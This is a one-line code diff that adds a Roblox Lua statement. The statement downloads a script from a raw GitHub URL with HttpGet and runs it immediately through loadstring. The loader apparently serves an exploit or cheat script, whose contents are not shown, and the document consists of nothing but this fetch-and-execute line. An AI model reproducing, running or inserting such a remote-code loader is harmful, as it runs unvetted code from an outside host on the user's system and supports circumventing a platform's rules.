@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Willizard/refs/heads/main/Matrixscope1"))()
